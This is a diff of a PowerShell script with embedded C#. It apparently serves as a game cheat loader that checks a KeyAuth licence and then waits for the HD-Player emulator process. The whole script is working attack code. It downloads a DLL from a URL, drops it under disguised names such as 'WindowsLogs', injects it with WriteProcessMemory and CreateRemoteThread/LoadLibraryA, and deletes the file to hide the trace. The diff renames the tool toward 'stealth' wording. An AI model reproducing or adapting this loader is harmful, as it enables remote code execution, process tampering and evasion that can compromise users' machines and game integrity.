@@ -11,7 +11,7 @@ $target  = "HD-Player"
 
 function Show-Auth {
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "    BASX MANUAL MAP SYSTEM    " -ForegroundColor Cyan
+    Write-Host "    BASX STEALTH BUFFER V4    " -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
     try {
@@ -25,7 +25,7 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
-    Write-Host "[+] Auth Success." -ForegroundColor Green
+    Write-Host "[+] Authentication Verified." -ForegroundColor Green
 
     $Source = @"
     using System;
@@ -35,42 +35,41 @@ if (Show-Auth) {
     using System.Text;
     using System.IO;
 
-    public class MapNode {
-        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
-        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
-        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
+    public class BufferNode {
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint acc, bool inh, int pid);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
         [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
-        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);
 
-        public static bool Inject(string url, int pid) {
+        public static bool BufferInject(string url, int pid) {
             try {
                 WebClient wc = new WebClient();
                 wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                byte[] dllBytes = wc.DownloadData(url);
+                byte[] dllData = wc.DownloadData(url);
 
+                // Open with high-level access
                 IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                 if (hProc == IntPtr.Zero) return false;
 
-                // Create a temporary decoy file in a hidden path
-                string hiddenDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsInternal");
-                if (!Directory.Exists(hiddenDir)) Directory.CreateDirectory(hiddenDir);
-                
-                string hiddenPath = Path.Combine(hiddenDir, "sys_cache_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
-                File.WriteAllBytes(hiddenPath, dllBytes);
+                // Create a masked path in a system-trusted folder
+                string bDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "WindowsLogs");
+                if (!Directory.Exists(bDir)) Directory.CreateDirectory(bDir);
+                string bPath = Path.Combine(bDir, "lib_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
+                File.WriteAllBytes(bPath, dllData);
 
-                // Allocate and Write Path
-                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)hiddenPath.Length + 1, 0x3000, 0x40);
-                IntPtr w;
-                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(hiddenPath), (uint)hiddenPath.Length + 1, out w);
+                // Allocate and Write
+                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)bPath.Length + 1, 0x3000, 0x40);
+                IntPtr written;
+                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(bPath), (uint)bPath.Length + 1, out written);
 
-                // LoadLibraryA via Remote Thread
-                IntPtr hKernel = GetModuleHandle("kernel32.dll");
-                IntPtr hLoadLib = GetProcAddress(hKernel, "LoadLibraryA");
-                IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoadLib, alloc, 0, IntPtr.Zero);
+                // Execute LoadLibrary
+                IntPtr hKern = GetModuleHandle("kernel32.dll");
+                IntPtr hLoad = GetProcAddress(hKern, "LoadLibraryA");
+                IntPtr hThrd = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoad, alloc, 0, IntPtr.Zero);
 
-                if (hThread != IntPtr.Zero) {
-                    System.Threading.Thread.Sleep(4000); // Wait for load
-                    if (File.Exists(hiddenPath)) File.Delete(hiddenPath);
+                if (hThrd != IntPtr.Zero) {
+                    System.Threading.Thread.Sleep(5000);
+                    if (File.Exists(bPath)) File.Delete(bPath);
                     return true;
                 }
             } catch { }
@@ -83,20 +82,19 @@ if (Show-Auth) {
 "@
     Add-Type -TypeDefinition $Source
 
-    Write-Host "[*] Status: Monitoring $target..." -ForegroundColor Cyan
+    Write-Host "[*] Status: Searching for $target..." -ForegroundColor Cyan
     while ($true) {
         $p = Get-Process $target -ErrorAction SilentlyContinue
         if ($p) {
-            Write-Host "[!] Target found. Mapping DLL into process space..." -ForegroundColor Yellow
-            if ([MapNode]::Inject($dllUrl, $p.Id)) {
-                Write-Host "[+] Injection successful! The DLL is now in memory." -ForegroundColor Green
-                Write-Host "[*] You can now press F6 in game." -ForegroundColor White
+            Write-Host "[!] Target found. Attempting Buffer Injection..." -ForegroundColor Yellow
+            if ([BufferNode]::BufferInject($dllUrl, $p.Id)) {
+                Write-Host "[+] Injection Success! Component mapped to $target." -ForegroundColor Green
                 break
             } else {
-                Write-Host "[-] Access Denied. Still blocked by Emulator." -ForegroundColor Red
+                Write-Host "[-] Access Denied. Still blocked by Emulator security." -ForegroundColor Red
                 Start-Sleep -Seconds 5
             }
         }
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 3
     }
 }
